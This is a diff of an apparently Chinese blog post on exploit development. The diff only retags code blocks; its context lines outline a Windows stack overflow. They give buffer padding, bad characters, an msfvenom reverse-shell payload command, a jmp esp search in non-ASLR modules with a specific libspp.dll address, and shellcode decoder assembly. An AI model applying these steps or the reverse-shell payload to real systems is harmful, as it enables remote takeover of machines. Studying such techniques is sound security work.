@@ -19,7 +19,7 @@ layout: default
  
 
 	大概流程如下:
-```c
+```
 2.1 根据上面分析其实己经得知分配的栈空间=30CH. (shellcode前填充字节数己确定)
 2.2 确定一下bad characters: \x00\x0a\x0d\x25\x26\x2b\x3d
 2.3 使用msfvenom 生成shellcode:
@@ -32,7 +32,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f c –e x86/sh
 
 > 大概流程如下:
 
-```c
+```
 3.1 找到所有载入模块
 3.2 遍历每一个模块IMAGE_OPTIONAL_HEADER中DllCharacteristics不能使用ASLR
 3.3 查找是否包含jmp esp的opcode: FFE4
@@ -47,7 +47,7 @@ libspp.dll 0x10090c83地址符合所有条件.
 >而解码代码需要知道需要解码的代码所在地址,这里需要使用到GetPC.
 >
 解码代码如下:
-```c
+```nasm
 mov 	edi,46BD1770h
 fcmovu 	st,st(6)		
 fnstenv	[esp-0Ch]		;保存fpu环境
@@ -69,7 +69,7 @@ sub		esi,0FFFFFFFCh
 
 ## 5.总结
 
-```c
+```
 主要是注意一下生成的shellcode使用的GetPC是哪种方式,注意栈空间是否会被破坏. 
 ```
 
